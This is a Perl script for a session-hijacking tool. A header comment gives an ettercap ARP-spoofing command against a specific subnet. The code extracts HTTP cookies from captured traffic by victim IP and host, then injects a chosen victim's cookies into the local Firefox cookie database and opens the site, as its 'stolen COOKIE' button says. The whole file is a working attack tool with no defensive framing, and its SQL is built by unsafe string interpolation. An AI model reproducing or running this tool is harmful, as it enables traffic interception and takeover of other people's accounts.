#!/usr/bin/perl
# ettercap -Tq -w ETTERCAP.cap -M arp:oneway /158.42.56.2-255/ /158.42.56.1/  -P autoadd
use strict;
use DateTime;
use Net::Pcap;
use Net::Pcap::Reassemble;
use NetPacket::Ethernet;
use NetPacket::IP;
use DBI;
use DBD::SQLite;
use Tk;
use Tk::MsgBox;


my ($top, $lst, $cookie_db, $file, $t, %box);

sub suicide {
 Tk::exit;
}

sub start_session {
  my $e = $lst->get( $lst->curselection->[0] );
  my ($src_ip, $complete_host) = $e =~ /<(.+)> \[(.+)\]/;
  my ($basedomain) = $complete_host =~ /\.?([^\.]+\.[^\.]+)$/;
  my $lock = $cookie_db;
  $lock =~ s/[^\/]+$/lock/;
  if (-l $lock) {
    $top->MsgBox( -icon => 'info', -title => 'Cookie DB Locked', -message => "Cookie Database $cookie_db is currently locked.\n".
		  "Terminate Firefox to unlock it and possibly start another spoofed session.", -type => 'ok' )->Show;
    return;
  }
  my $dbh = DBI->connect("dbi:SQLite:dbname=$cookie_db",'','', { AutoCommit => 1, sqlite_use_immediate_transaction => 1 });
  my $sth = $dbh->prepare(" DELETE FROM moz_cookies WHERE baseDomain LIKE '%$basedomain%' OR host LIKE '%$complete_host%' ");
  $sth->execute;
  my %cookies = %{$box{$src_ip}->{$complete_host}};
  my $expiry = DateTime->now->add( years => 2 )->epoch;
  foreach my $key (keys %cookies) { 
    $complete_host = '.' . $complete_host if ($complete_host eq $basedomain);
    $sth = $dbh->prepare(" INSERT INTO moz_cookies(name, value, baseDomain, host, path, expiry, isSecure, isHttpOnly)
			   VALUES('$key', '$cookies{$key}', '$basedomain', '.$basedomain', '/', $expiry, 0, 0) ");
    $sth->execute;
  }
  $dbh->disconnect;
  $complete_host =~ s/^\.//;
  system("firefox www.$basedomain &");
}

sub pick_mozilla_cookiedb {
  print "Trying to determine a local firefox cookie SQLite Database... ";
  open(my $moz_profiles, $ENV{HOME}."/.mozilla/firefox/profiles.ini");
  my $db_path;
  while (my $row = <$moz_profiles>) {
    if ($row =~ /Path=/) {
      ($db_path) = $row =~ /Path=(.+)/;
      last;
    }
  }
  close $moz_profiles;
  my $db = $ENV{HOME}."/.mozilla/firefox/".$db_path."/cookies.sqlite";
  if (-w $db) {
    print "OK $db\n";
  } else {
    die "ERROR: No firefox cookie database found.\n";
  }
  return $db;
}

sub store_cookie {
  my ($ref, $cookie) = @_;
  $cookie =~ s/\s//g;
  my @cookies = split(';', $cookie);
  foreach my $c (@cookies) {
    my ($name, $value) = $c =~ /^(.+)\=(.+)$/;
    ${$ref}->{$name} = $value;
  }
}

sub process_packet {
  shift;
  my ($header, $packet) = @_;
  my ($host, $cookie_hdr);
  if ($packet =~ /Cookie:/) { # If this packet contains a cookie... steal it ;)
    ($host) = $packet =~ /Host: ([^\cM]+)/;
    ($cookie_hdr) = $packet =~ /Cookie: ([^\cM\cJ]+)/;
    my $ip_obj = NetPacket::IP->decode(NetPacket::Ethernet::strip($packet));
    if (not exists $box{$ip_obj->{src_ip}}->{$host}) {
      my $ref = \$box{$ip_obj->{src_ip}}->{$host};
      store_cookie($ref, $cookie_hdr);
      my ($cook) = $cookie_hdr =~ /^(.{1,100})/;
      $lst->insert('end', "<$ip_obj->{src_ip}> [$host] $cook");
    }
  }
}

sub parse_capture {
  my ($err, $filter, $suffix);
  my $pcap = pcap_open_offline($file, \$err) or die "ERROR Can't read '$file': $err.\n";
  pcap_compile($pcap, \$filter, "tcp port 80 or tcp port 8080", 1, 0);
  pcap_setfilter($pcap, $filter);
  Net::Pcap::Reassemble::loop($pcap, 1000, \&process_packet, 0);
  pcap_close($pcap);
  pcap_freecode($filter);
}

$cookie_db = pick_mozilla_cookiedb;



$file = $ARGV[0];
$SIG{INT} = \&suicide;
$top = new MainWindow( -title => "Analyzing $file" );
my $kill = $top->Button ( -text => "Start Parsing $file", -command => \&parse_capture )->pack;
$lst = $top->Listbox( -selectmode => 'single', -width => '100')->pack;
my $but = $top->Button( -text => 'Open selected session with stolen COOKIE', -command => \&start_session)->pack;
MainLoop;
